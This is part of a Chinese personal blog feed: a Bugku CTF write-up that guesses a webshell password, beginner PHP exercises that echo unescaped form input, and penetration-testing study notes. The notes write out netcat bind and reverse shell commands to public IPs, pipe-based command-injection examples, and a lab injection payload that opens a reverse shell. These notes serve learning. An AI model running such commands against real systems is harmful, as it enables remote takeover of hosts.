        <content type="html"><![CDATA[<p>web日常训练，题目源于bugku</p><span id="more"></span><h1 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h1><p><img src="c1.jpg" alt="网站被黑"><br>提示信息：网站被黑<br>用御剑扫出一些文件：<br><img src="c2.jpg" alt="扫描结果"><br>尝试了下，shell.php有一个webshell的登录窗口<br><img src="c3.jpg" alt="扫描结果"><br>根据提示信息，有一条思路：burp字典扫描，把密码扫出来<br>结果一无所获……<br>后面根据题目信息盲猜一波：hack<br><img src="c4.jpg" alt="flag"><br>感觉字典可以拿去烧了，这都扫不出来……<br>flag{6c85b0d87c24e6152ef6f0fa0296e554}<br><img src="c5.jpg" alt="flag"><br>吃一堑长一智，补到字典去……</p>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-学习日志-015</title>
      <link href="/2023/03/22/PHP-Study-015/"/>
      <url>/2023/03/22/PHP-Study-015/</url>
      
        <content type="html"><![CDATA[<p>PHP零散小项目</p><span id="more"></span><h1 id="瞎鼓捣的录入和回显"><a href="#瞎鼓捣的录入和回显" class="headerlink" title="瞎鼓捣的录入和回显"></a>瞎鼓捣的录入和回显</h1><p>主要灵感来源于之前在搞python时，要固定一个永恒变量(把变量的值另外找一个文件存起来)，防止变量变成程序执行完成就销毁的临时变量。</p><p>想要存储和读取数据我知道的有两种，一种是我这种直接写入文件的，另外一种是数据库。</p><p>数据库暂且不说，毕竟还没鼓捣，最近还得考试嘛……</p><p>鼓捣下文件存储变量的，具体如下：</p><ol><li>准备1个php文件和1个txt文件，放在同一个目录下</li><li>php文件取名为“file.php”,txt文件取名为“file.txt”</li></ol><p><strong>PHP文件内容如下</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;小东西&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        * &#123;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">            padding: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        table &#123;</span><br><span class="line">            border: <span class="number">1</span>px solid red;</span><br><span class="line">            margin: <span class="number">10</span>px <span class="number">30</span>px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        table tr td &#123;</span><br><span class="line">            border: <span class="number">1</span>px solid black;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        form &#123;</span><br><span class="line">            margin: <span class="number">10</span>px <span class="number">30</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;file.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        填写表格录入信息：&lt;br&gt;</span><br><span class="line">        班级：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;Sclass&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">        姓名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;Sname&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">        座号：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;Sid&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="comment">// 录入数据</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>);</span><br><span class="line">            <span class="variable">$str</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Sclass&#x27;</span>] . <span class="string">&#x27;,&#x27;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;Sname&#x27;</span>] . <span class="string">&#x27;,&#x27;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;Sid&#x27;</span>] . <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="variable">$str</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;y.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;zhanshi&quot;</span> value=<span class="string">&quot;点击展示数据&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;table&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;&lt;strong&gt;id&lt;/strong&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;strong&gt;班级&lt;/strong&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;strong&gt;姓名&lt;/strong&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;strong&gt;座位号&lt;/strong&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="comment">// 如果点击按钮，则展示数据</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;zhanshi&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$file_r</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">            <span class="variable">$xs</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$file_r</span>)) &#123;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$xs</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">                <span class="variable">$x</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$file_r</span>);</span><br><span class="line">                <span class="variable">$y</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$x</span>);</span><br><span class="line">                <span class="variable">$xs</span> += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;<span class="subst">&#123;$xs&#125;</span>&lt;/td&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$y</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;<span class="subst">&#123;$y[$i]&#125;</span>&lt;/td&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$file_r</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/table&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>txt文件内容留空就行，毕竟本身就是存储数据的容器。</p><p>下面是效果：<br><img src="c1.jpg" alt="录入数据和展示数据"><br><img src="c2.jpg" alt="录入数据和展示数据"></p><h1 id="排序的小作业"><a href="#排序的小作业" class="headerlink" title="排序的小作业"></a>排序的小作业</h1><p>emmmmm……行吧，这东西还真……简单。</p><p>题目本意是这样的：展示一个二维数组，并且成绩部分要进行降序排序。</p><p>具体什么的也没啥好说的，看下面展示吧。勉强算好玩……</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;站点创建成功-phpstudy <span class="keyword">for</span> windows&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        table,</span><br><span class="line">        table tr td &#123;</span><br><span class="line">        border: solid <span class="number">1</span>px red;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;table&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;&lt;b&gt;座位号&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;b&gt;名字&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;b&gt;性别&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;b&gt;分数&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">11</span>, <span class="string">&quot;tom&quot;</span>, <span class="string">&quot;man&quot;</span>, <span class="number">334</span>),</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">12</span>, <span class="string">&quot;sasa&quot;</span>, <span class="string">&quot;wman&quot;</span>, <span class="number">336</span>),</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">13</span>, <span class="string">&quot;jack&quot;</span>, <span class="string">&quot;man&quot;</span>, <span class="number">339</span>),</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">14</span>, <span class="string">&quot;lisa&quot;</span>, <span class="string">&quot;wman&quot;</span>, <span class="number">335</span>),</span><br><span class="line">        <span class="keyword">array</span>(<span class="number">15</span>, <span class="string">&quot;tmx&quot;</span>, <span class="string">&quot;man&quot;</span>, <span class="number">360</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$x</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$x</span>[<span class="variable">$i</span>] = <span class="variable">$arr</span>[<span class="variable">$i</span>][<span class="number">3</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">rsort</span>(<span class="variable">$x</span>);</span><br><span class="line">    <span class="variable">$y</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">5</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">5</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$x</span>[<span class="variable">$i</span>] == <span class="variable">$arr</span>[<span class="variable">$j</span>][<span class="number">3</span>]) &#123;</span><br><span class="line">                <span class="variable">$y</span>[<span class="variable">$i</span>] = <span class="variable">$arr</span>[<span class="variable">$j</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$y</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$y</span>[<span class="number">1</span>]); <span class="variable">$j</span>++) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;<span class="subst">&#123;$y[$i][$j]&#125;</span>&lt;/td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/table&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="c3.jpg" alt="成绩降序排序"></p><h1 id="质数判断器"><a href="#质数判断器" class="headerlink" title="质数判断器"></a>质数判断器</h1><p>壳部分的逻辑：</p><ul><li>输入两个值，通过post传参得到php处理程序</li><li>如果两值不输入，默认为1和5</li><li>对比两值大小，保证恒为前小后大</li><li>调用函数对范围内的数字挨个进行判断</li><li>回显所有判断的结果，且一行仅限输出8个结果</li></ul><p>质数的判断函数遵循的逻辑：</p><ul><li>传入数值，如果为1时，恒返回1(为质数)</li><li>传入数值大于1，会取这个数前面的所有数字与之相余<ul><li>余数为0：恒返回0，为非质数</li><li>余数非0：退出循环时返回1，为质数</li></ul></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;质数判断器&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        * &#123;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">            padding: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        body &#123;</span><br><span class="line">            background-color: orange;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        form &#123;</span><br><span class="line">            margin: <span class="number">50</span>px auto;</span><br><span class="line">            background-color: <span class="comment">#e3b4b8;</span></span><br><span class="line">            width: <span class="number">300</span>px;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .word &#123;</span><br><span class="line">            width: <span class="number">200</span>px;</span><br><span class="line">            height: auto;</span><br><span class="line">            text-align: left;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;x2.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        &lt;h1&gt;质数判断器&lt;/h1&gt;</span><br><span class="line">        请输入俩值进行质数判断:</span><br><span class="line">        &lt;br&gt;值<span class="number">1</span>：&lt;input type=<span class="string">&quot;number&quot;</span> name=<span class="string">&quot;val1&quot;</span> value=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">        &lt;br&gt;值<span class="number">2</span>：&lt;input type=<span class="string">&quot;number&quot;</span> name=<span class="string">&quot;val2&quot;</span> value=<span class="string">&quot;5&quot;</span>&gt;</span><br><span class="line">        &lt;br&gt;&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">        &lt;input type=<span class="string">&quot;reset&quot;</span> value=<span class="string">&quot;重置&quot;</span> name=<span class="string">&quot;reset&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>])) &#123;</span><br><span class="line">            <span class="comment">// 质数判断器</span></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">prenum</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="variable">$n</span> = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$num</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">2</span>; <span class="variable">$i</span> &lt; <span class="variable">$num</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$num</span> % <span class="variable">$i</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="variable">$n</span> = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$n</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$num1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;val1&#x27;</span>];</span><br><span class="line">            <span class="variable">$num2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;val2&#x27;</span>];</span><br><span class="line">            <span class="comment">// 确保值的范围无误</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$num1</span> &gt; <span class="variable">$num2</span>) &#123;</span><br><span class="line">                <span class="variable">$x</span> = <span class="variable">$num1</span>;</span><br><span class="line">                <span class="variable">$num1</span> = <span class="variable">$num2</span>;</span><br><span class="line">                <span class="variable">$num2</span> = <span class="variable">$x</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;您所输入的从<span class="subst">&#123;$num1&#125;</span>到<span class="subst">&#123;$num2&#125;</span>范围的质数有：&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">for</span> (; <span class="variable">$num1</span> &lt;= <span class="variable">$num2</span>; <span class="variable">$num1</span>++) &#123;</span><br><span class="line">                <span class="variable">$n</span> = <span class="title function_ invoke__">prenum</span>(<span class="variable">$num1</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$n</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">array_push</span>(<span class="variable">$arr</span>, <span class="variable">$num1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;word&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((<span class="variable">$i</span> + <span class="number">1</span>) % <span class="number">8</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$arr[$i]&#125;</span>,&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$arr[$i]&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="c4.jpg" alt="输入的判断"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0010</title>
      <link href="/2023/03/21/SEC-Study-0010/"/>
      <url>/2023/03/21/SEC-Study-0010/</url>
      
        <content type="html"><![CDATA[<p>基础</p><span id="more"></span><h1 id="基础蓝图"><a href="#基础蓝图" class="headerlink" title="基础蓝图"></a>基础蓝图</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1、Web常规-系统&amp;中间件&amp;数据库&amp;源码等<br>2、Web其他-前后端&amp;软件&amp;Docker&amp;分配站等<br>3、Web拓展-CDN&amp;WAF&amp;OSS&amp;反向&amp;负载均衡等</p><hr><p>1、APP架构-封装&amp;原生态&amp;H5&amp;flutter等<br>2、小程序架构-Web&amp;H5&amp;JS&amp;VUE框架等</p><hr><p>1、渗透命令-常规命令&amp;文件上传下载<br>2、反弹Shell-防火墙策略&amp;正反向连接<br>3、数据回显-查询带外&amp;网络协议层级</p><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><p>应用架构：Web/APP/云应用/小程序/负载均衡等<br>安全产品：CDN/WAF/IDS/IPS/蜜罐/防火墙/杀毒等<br>渗透命令：文件上传下载/端口服务/Shell反弹等<br>抓包技术：HTTP/TCP/UDP/ICMP/DNS/封包/代理等<br>算法加密：数据编码/密码算法/密码保护/反编译/加壳等</p><h1 id="正反向策略-带外查询"><a href="#正反向策略-带外查询" class="headerlink" title="正反向策略+带外查询"></a>正反向策略+带外查询</h1><h2 id="常规基本渗透命令详解"><a href="#常规基本渗透命令详解" class="headerlink" title="常规基本渗透命令详解"></a>常规基本渗透命令详解</h2><p><a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">渗透测试中常用的命令</a></p><h2 id="实用案例1：文件上传下载-解决无图形化-amp-解决数据传输"><a href="#实用案例1：文件上传下载-解决无图形化-amp-解决数据传输" class="headerlink" title="实用案例1：文件上传下载-解决无图形化&amp;解决数据传输"></a>实用案例1：文件上传下载-解决无图形化&amp;解决数据传输</h2><p>命令生成：<a href="https://forum.ywhack.com/bountytips.php?download">棱角社区</a><br>Linux：wget curl python ruby perl java等<br>Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32等</p><h2 id="实用案例2：反弹Shell命令-解决数据回显-amp-解决数据通讯"><a href="#实用案例2：反弹Shell命令-解决数据回显-amp-解决数据通讯" class="headerlink" title="实用案例2：反弹Shell命令-解决数据回显&amp;解决数据通讯"></a>实用案例2：反弹Shell命令-解决数据回显&amp;解决数据通讯</h2><p>命令生成：<a href="https://forum.ywhack.com/shell.php">棱角社区</a><br>返回窗口，绑定权限。<br>反弹Shell命令：把对面的权限反弹过来，防止流量断续连接。</p><p>1、正向连接：本地监听等待对方连接(你主动找别人)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 谁监听端口就控制谁</span></span><br><span class="line"></span><br><span class="line">Linux控制Windows</span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line"><span class="comment"># win监听，然后给出权限</span></span><br><span class="line"><span class="comment"># 本地，等待别人过来连接</span></span><br><span class="line">// 绑定CMD到本地5566端口</span><br><span class="line">// 注意：这里需要一个nc.exe的win程序。</span><br><span class="line">nc -e cmd -lvp 5566</span><br><span class="line"></span><br><span class="line"><span class="comment"># Kali</span></span><br><span class="line">//主动连接目标5566</span><br><span class="line"><span class="comment"># 这是Windows主机的IP地址</span></span><br><span class="line">ncat 47.122.23.131 5566</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------</span></span><br><span class="line"></span><br><span class="line">Windows控制Linux</span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line"><span class="comment"># 本地自己监听，等待对方来对应端口进行连接(不主动连接我你就没权限/shell)</span></span><br><span class="line">//绑定SH到本地5566端口</span><br><span class="line">ncat -e /bin/sh -lvp 5566</span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">//主动连接目标5566</span><br><span class="line">nc 47.94.236.117 5566</span><br></pre></td></tr></table></figure><p>2、反向连接：主动给权限出去，让对方监听(别人主动来找你)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 谁监听就控制对方</span></span><br><span class="line"></span><br><span class="line">//绑定CMD到目标5566端口</span><br><span class="line"><span class="comment"># 绑定sh，绑定对方的IP地址，绑定对方的端口</span></span><br><span class="line"><span class="comment"># 把权限/shell弹出到对方对应的id和端口上</span></span><br><span class="line">ncat -e /bin/sh 47.122.23.131 5566</span><br><span class="line"></span><br><span class="line"><span class="comment"># windows，正在使用5566进行监听(躺赢，等着别人把权限/shell送上门)</span></span><br><span class="line"><span class="comment"># 等待上钩的</span></span><br><span class="line"><span class="comment"># 本地，等待权限自己弹过来</span></span><br><span class="line">//等待5566连接，一旦连接成立，直接控制</span><br><span class="line">nc -lvvp 5566</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//绑定CMD到目标5566端口</span><br><span class="line">nc -e cmd 47.94.236.117 5566</span><br><span class="line">//等待5566连接</span><br><span class="line">ncat -lvvp 5566</span><br></pre></td></tr></table></figure><p>总的理解就是：Linux控制Windows服务器（俩远程主机要进行控制），选择有二：</p><ul><li>第一种：Linux主动找到Windows server，Windows server主动进行本地监听。<ul><li>此时，Linux通过连接本地端口对其进行控制。</li></ul></li><li>第二种：Windows server自己把权限主动给到Linux，而Linux则进行本地监听，对Windows server进行控制。</li></ul><h2 id="内网环境"><a href="#内网环境" class="headerlink" title="内网环境"></a>内网环境</h2><p>含义：主网通过一个公网IP/组网网卡来上网。例如下面布置很多机器，公用一个上网网卡，内网主机主动出来找你连接比你在外网通过公网连接到内网方便。</p><p>应用场景：学校一大堆电脑的计算机机房，网吧，公司等等。</p><h2 id="问题：尝试控制内网某一台主机"><a href="#问题：尝试控制内网某一台主机" class="headerlink" title="问题：尝试控制内网某一台主机"></a>问题：尝试控制内网某一台主机</h2><p>1.从外网对内部主机进行控制(行不通)</p><ul><li>外网ip具备唯一性</li><li>外网主机最多找到内网的公共网卡ip</li><li>外网主机无法进一步确定内网主机的位置</li><li>内网ip不是唯一的</li></ul><p>2.从内网反弹出shell给外网(行得通)</p><ul><li>反向，主动给出shell</li><li>主动找唯一的外网ip –&gt;容易</li></ul><h2 id="实际案例1：防火墙绕过-正向连接-amp-反向连接-amp-内网服务器"><a href="#实际案例1：防火墙绕过-正向连接-amp-反向连接-amp-内网服务器" class="headerlink" title="实际案例1：防火墙绕过-正向连接&amp;反向连接&amp;内网服务器"></a>实际案例1：防火墙绕过-正向连接&amp;反向连接&amp;内网服务器</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">管道符：| (管道符号) ||（逻辑或） &amp;&amp;（逻辑与）  &amp;(后台任务符号)</span><br><span class="line">Windows-&gt;| &amp; || &amp;&amp;</span><br><span class="line">Linux-&gt;; | || &amp; &amp;&amp; ``(特有``和;)</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">ping -c 1 127.0.0.1 ; <span class="built_in">whoami</span></span><br><span class="line">ping -c 1 127.0.0.1 | <span class="built_in">whoami</span></span><br><span class="line">ping -c 1 127.0.0.1 || <span class="built_in">whoami</span></span><br><span class="line">ping -c 1 127.0.0.1 &amp; <span class="built_in">whoami</span></span><br><span class="line">ping -c 1 127.0.0.1 &amp;&amp; <span class="built_in">whoami</span></span><br><span class="line">ping -c 1 127.0.0.1 `<span class="built_in">whoami</span>`</span><br></pre></td></tr></table></figure><p>实战靶场</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">思路：利用ping命令管道漏洞，外网主机让目标服务器下载靶机服务器的软件nc.exe，再通过cmd ping的漏洞使远程主机主动弹出shell给外网主机进行控制。</span><br><span class="line"></span><br><span class="line">1、判断为windows ==&gt; administrator</span><br><span class="line">2、windows没有自带的nc ==&gt; 文件上传nc</span><br><span class="line">3、想办法上传nc 反弹权限</span><br><span class="line">4、反弹</span><br><span class="line"></span><br><span class="line">开启入站策略，采用反向连接</span><br><span class="line">Linux：ncat -lvvp 5566</span><br><span class="line">Windows：127.0.0.1 | nc -e cmd 47.94.236.117 5566</span><br><span class="line"></span><br><span class="line">开启出站策略，采用正向连接</span><br><span class="line">Linux：ncat -e 